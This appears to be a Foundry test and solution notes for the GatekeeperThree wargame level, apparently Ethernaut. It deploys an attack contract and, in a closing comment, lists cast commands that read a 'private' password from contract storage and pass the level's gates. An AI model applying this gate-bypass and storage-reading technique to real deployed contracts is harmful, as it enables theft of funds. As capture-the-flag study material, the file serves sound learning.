// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {GatekeeperThree} from "../src/GatekeeperThree.sol";
import {GatekeeperThreeAttack} from "../solutions/GatekeeperThreeAttack.sol";

contract GatekeeperThreeTest is Test {
    GatekeeperThree public gatekeeperThree;
    GatekeeperThreeAttack public attackContract;
    address public attacker;

    function setUp() public {
        gatekeeperThree = new GatekeeperThree();
        attacker = makeAddr("attacker");
    }

    function test_attackGatekeeperThree() public {
        vm.startPrank(attacker);

        attackContract = new GatekeeperThreeAttack(
            payable(address(gatekeeperThree))
        );

        vm.stopPrank();
    }
}

/*
source .env

export gatekeeperThree=0x024739967085020fa1448e3244F86d6211B175C2
forge create solutions/GatekeeperThreeAttack.sol:GatekeeperThreeAttack --rpc-url $RPC_URL --private-key $PRIVATE_KEY --constructor-args $gatekeeperThree

export attackContract=0x894Aa7aBA9A2822B41a30DBe5D094f5F2828372F

cast send $attackContract "attack()" --value 0.0011ether --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast call $gatekeeperThree "trick()" --rpc-url $RPC_URL

export trick=0xfb555dda713697a2714de81b1b0b1930e491f8de
cast storage $trick 2 --rpc-url $RPC_URL
export password=1708300539
cast send $gatekeeperThree "getAllowance(uint)" $password --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast send $attackContract "enter()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY

cast call $gatekeeperThree "entrant()" --rpc-url $RPC_URL
cast call $gatekeeperThree "owner()" --rpc-url $RPC_URL
cast call $gatekeeperThree "allowEntrance()" --rpc-url $RPC_URL

forge test --match-test test_attackGatekeeperThree
*/
